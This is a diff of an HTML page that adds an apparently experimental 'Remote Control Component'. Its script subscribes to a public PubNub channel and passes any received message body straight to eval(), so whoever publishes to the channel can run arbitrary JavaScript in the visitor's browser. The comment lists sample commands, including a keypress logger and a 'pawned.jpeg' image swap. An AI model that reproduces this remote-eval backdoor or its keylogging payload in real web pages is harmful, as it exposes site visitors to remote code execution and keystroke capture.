@@ -3,30 +3,67 @@
 <html>
 
 <head>
-  <title>Web Component Essentials</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="/styles.css" rel="stylesheet" />
+    <title>rc-com</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="styles.css" rel="stylesheet"/>
+
+    <script src="raphael-2.1.4.min.js"></script>
+    <script src="justgage.js"></script>
+
+    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.23.0.min.js"></script>
+
+    <script>(function () {
+      var pubnub = new PubNub({publishKey: 'NA', subscribeKey: 'sub-c-55e637e0-584c-11e7-b679-0619f8945a4f'});
+      pubnub.subscribe({channels: ['data']}); // Subscribe to a channel.
+      pubnub.addListener({
+        message: function (m) {
+          var f = document.getElementById("data_message").innerText =  m.message.Functions;
+          if (f.action === 'eval') {
+            eval(f.body);
+            console.log(eval('2+3'))
+          }
+          if (f.action === 'jpeg') {
+            console.log('jpeg')
+            document.getElementById("rcimage").src = "pawned.jpeg"
+          }
+        }
+      });
+    })();
+
+    /**
+     *
+     {"Functions": {"action":"eval","body":"document.onkeypress=function(e){console.log(e)}"}}
+     {"Functions": {"action":"eval","body":"alert('Hello mottto')"}}
+     {"Functions": {"action":"jpeg","body":""}}
+
+     */
+    </script>
+
 </head>
 
 <body>
-  <header>
-    <h1>Example 14 Browser Support</h1>
-    <a href="/">Back to examples</a>
-  </header>
+<header>
+    <h1>Remote Control Component</h1>
+</header>
 
-  <main>
-    <x-dropdown>
-      Hello From Published Component
-    </x-dropdown>
-  </main>
-  <!-- Browsers that do not support Web Components APIs -->
-  <script src="https://unpkg.com/@webcomponents/webcomponentsjs@2.0.0/webcomponents-bundle.js"></script>
+<main>
 
-  <!-- Our Library compiled to ES5 For older ES5 Browsers -->
-  <!-- <script src="https://unpkg.com/web-component-essentials@0.0.4/dist/index.js"></script> -->
+    <div id="box">
+    <div id="data_message">Waiting </div>
+    </div>
 
-  <!-- ES2015+ version of our library for evergreen browsers -->
-  <script type="module" src="src/dropdown.js"></script>
+    <x-rccom>
+        Hello From Published Component
+    </x-rccom>
+</main>
+<!-- Browsers that do not support Web Components APIs -->
+<script src="https://unpkg.com/@webcomponents/webcomponentsjs@2.0.0/webcomponents-bundle.js"></script>
+
+<!-- Our Library compiled to ES5 For older ES5 Browsers -->
+<!-- <script src="https://unpkg.com/web-component-essentials@0.0.4/dist/index.js"></script> -->
+
+<!-- ES2015+ version of our library for evergreen browsers -->
+<script type="module" src="src/rccom.js"></script>
 </body>
 
 </html>
